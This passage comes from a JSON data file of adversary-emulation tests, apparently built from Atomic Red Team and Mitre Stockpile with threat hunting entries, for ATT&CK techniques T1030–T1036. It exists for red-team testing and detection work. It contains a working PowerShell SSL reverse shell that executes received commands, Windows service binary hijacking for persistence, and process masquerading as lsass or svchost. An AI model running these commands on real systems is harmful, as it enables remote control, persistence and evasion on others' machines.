"attack.t1003", "attack.t1028", "attack.s0005"], "falsepositives": ["low"], "level": "high"}}]}, {"technique_id": "T1030", "commands": [{"source": "atomics/T1030/T1030.yaml", "command": "cd /tmp/T1030; split -b 5000000 #{file_name}\nls -l /tmp/T1030\n", "name": null}, {"source": "atomics/T1030/T1030.yaml", "command": "cd #{folder_path}; split -b 5000000 T1030_urandom\nls -l #{folder_path}\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Data Transfer Size Limits": {"attack_technique": "T1030", "display_name": "Data Transfer Size Limits", "atomic_tests": [{"name": "Data Transfer Size Limits", "description": "Take a file/directory, split it into 5Mb chunks\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"folder_path": {"description": "Path where the test creates artifacts", "type": "Path", "default": "/tmp/T1030"}, "file_name": {"description": "File name", "type": "Path", "default": "T1030_urandom"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "The file must exist for the test to run.", "prereq_command": "if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path}; touch #{folder_path}/safe_to_delete; fi;      \ndd if=/dev/urandom of=#{folder_path}/#{file_name} bs=25000000 count=1\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n", "cleanup_command": "if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;\n"}}]}}], "command_list": ["cd /tmp/T1030; split -b 5000000 #{file_name}\nls -l /tmp/T1030\n", "cd #{folder_path}; split -b 5000000 T1030_urandom\nls -l #{folder_path}\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1031", "commands": [{"source": "atomics/T1031/T1031.yaml", "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1031 Test'\\\"\"\nsc start Fax\n", "name": null}, {"source": "data/abilities/persistence/52771610-2322-44cf-816b-a7df42b4c086.yml", "command": {"windows": {"psh": {"command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n", "cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n"}}}, "name": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n"}, {"source": "Threat Hunting Tables", "command": "sc.exe", "name": "parent_process"}], "parsed_datasets": [{"Atomic Red Team Test - Modify Existing Service": {"attack_technique": "T1031", "display_name": "Modify Existing Service", "atomic_tests": [{"name": "Modify Fax service to run PowerShell", "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\n\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1031 Test'\\\"\"\nsc start Fax\n", "cleanup_command": "sc config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\" >nul 2>&1"}}]}}, {"Mitre Stockpile - This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n": {"id": "52771610-2322-44cf-816b-a7df42b4c086", "name": "Replace a service binary with alternate binary", "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n", "tactic": "persistence", "technique": {"attack_id": "T1031", "name": "Modify Existing Service"}, "platforms": {"windows": {"psh": {"command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n", "cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.service.modifiable"}]}]}}, {"Threat Hunting Tables": {"chain_id": "100073", "os": "windows", "parent_process": "sc.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "sc", "mitre_attack": "T1031", "itw_sample": ""}}], "command_list": ["sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1031 Test'\\\"\"\nsc start Fax\n", {"windows": {"psh": {"command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n", "cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n"}}}, "sc.exe"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"sc.exe\"or process_path contains \"powershell.exe\"or process_path contains \"cmd.exe\")and process_command_line contains \"*sc*config*binpath*\"", "name": "Modify Existing Service"}], "possible_detections": []}, {"technique_id": "T1032", "commands": [{"source": "atomics/T1032/T1032.yaml", "command": "$server_ip = 127.0.0.1\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fake.domain', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n", "name": null}, {"source": "atomics/T1032/T1032.yaml", "command": null, "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Standard Cryptographic Protocol": {"attack_technique": "T1032", "display_name": "Standard Cryptographic Protocol", "atomic_tests": [{"name": "OpenSSL C2", "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n", "supported_platforms": ["windows"], "input_arguments": {"server_ip": {"description": "IP of the external server", "type": "String", "default": "127.0.0.1"}, "server_port": {"description": "The port to connect to on the external server", "type": "String", "default": 443}}, "executor": {"name": "powershell", "elevation_required": false, "command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fake.domain', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n"}}]}}], "command_list": ["$server_ip = 127.0.0.1\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fake.domain', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n", null], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1036", "commands": [{"source": "atomics/T1036/T1036.yaml", "command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "cp /bin/sh /tmp/crond\n/tmp/crond\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe /B\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy PathToAtomicsFolder\\T1036\\bin\\t1036.exe #{outputfile}\n$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy #{inputfile} ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy $env:ComSpec #{outputfile}\n$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy #{inputfile} ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036 > C:\\T1036.txt\n", "name": null}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Recycle.bin", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Users\\All Users\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Users\\Default\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Users\\Public\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Perflogs\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\config\\systemprofile\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Windows\\Fonts\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Windows\\IME\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Windows\\addins\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\ProgramData\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "csrsr.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "csrss.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=*\\Windows\\System32\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "cssrss.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "explorer.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=*\\Windows\\System32\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "iexplore.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "isass.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "lexplore.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "lsm.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=*\\Windows\\System32\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "lssass.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "mmc.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=*\\Windows\\System32\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "!=wininit.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "lsass", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "run32dll.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "rundII.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "scvhost.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "smss.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=services.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "svchost.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "svchosts.exe", "name": "parent_process"}], "parsed_datasets": [{"Atomic Red Team Test - Masquerading": {"attack_technique": "T1036", "display_name": "Masquerading", "atomic_tests": [{"name": "Masquerading as Windows LSASS process", "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "cleanup_command": "del /Q /F %SystemRoot%\\Temp\\lsass.exe >nul 2>&1\n"}}, {"name": "Masquerading as Linux crond process.", "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": false, "command": "cp /bin/sh /tmp/crond\n/tmp/crond\n"}}, {"name": "Masquerading - cscript.exe running as notepad.exe", "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n", "cleanup_command": "del /Q /F %APPDATA%\\notepad.exe >nul 2>&1\n"}}, {"name": "Masquerading - wscript.exe running as svchost.exe", "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe /B\n", "cleanup_command": "del /Q /F %APPDATA%\\svchost.exe >nul 2>&1\n"}}, {"name": "Masquerading - powershell.exe running as taskhostw.exe", "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n", "cleanup_command": "del /Q /F %APPDATA%\\taskhostw.exe >nul 2>&1\n"}}, {"name": "Masquerading - non-windows exe running as windows exe", "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.exe as svchost.exe from on a non-standard path.\n", "supported_platforms": ["windows"], "input_arguments": {"inputfile": {"description": "path of file to copy", "type": "path", "default": "PathToAtomicsFolder\\T1036\\bin\\t1036.exe"}, "outputfile": {"description": "path of file to execute", "type": "path", "default": "($env:TEMP + \"\\svchost.exe\")"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Exe file to copy must exist on disk at specified location (#{inputfile})\n", "prereq_command": "if (Test-Path #{inputfile}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inputfile}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/t1036.exe\" -OutFile \"#{inputfile}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "copy #{inputfile} #{outputfile}\n$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036\n", "cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n"}}, {"name": "Masquerading - windows exe running as different windows exe", "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n", "supported_platforms": ["windows"], "input_arguments": {"inputfile": {"description": "path of file to copy", "type": "path", "default": "$env:ComSpec"}, "outputfile": {"description": "path of file to execute", "type": "path", "default": "($env:TEMP + \"\\svchost.exe\")"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "copy #{inputfile} #{outputfile}\n$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036\n", "cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n"}}, {"name": "Malicious process Masquerading as LSM.exe", "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036 > C:\\T1036.txt\n", "cleanup_command": "del C:\\T1036.txt >nul 2>&1\ndel C:\\lsm.exe >nul 2>&1\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100002", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\Recycle.bin", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100003", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\Users\\All Users\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100004", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\Users\\Default\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100005", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\Users\\Public\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100006", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\Perflogs\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100007", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\config\\systemprofile\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100008", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\Windows\\Fonts\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100009", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\Windows\\IME\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100010", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\Windows\\addins\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100011", "os": "windows", "parent_process": "*.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "\\ProgramData\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100021", "os": "windows", "parent_process": "csrsr.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100022", "os": "windows", "parent_process": "csrss.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "!=*\\Windows\\System32\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100023", "os": "windows", "parent_process": "cssrss.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100033", "os": "windows", "parent_process": "explorer.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "!=*\\Windows\\System32\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100035", "os": "windows", "parent_process": "iexplore.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100036", "os": "windows", "parent_process": "isass.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100037", "os": "windows", "parent_process": "lexplore.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100038", "os": "windows", "parent_process": "lsm.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "!=*\\Windows\\System32\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100039", "os": "windows", "parent_process": "lssass.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100040", "os": "windows", "parent_process": "mmc.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "!=*\\Windows\\System32\\", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100050", "os": "windows", "parent_process": "!=wininit.exe", "commandline_string": "", "sub_process_1": "lsass", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": "https://digital-forensics.sans.org/media/dfir_poster_2014.pdf"}}, {"Threat Hunting Tables": {"chain_id": "100071", "os": "windows", "parent_process": "run32dll.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100072", "os": "windows", "parent_process": "rundII.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100075", "os": "windows", "parent_process": "scvhost.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100077", "os": "windows", "parent_process": "smss.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100078", "os": "windows", "parent_process": "!=services.exe", "commandline_string": "", "sub_process_1": "svchost.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", 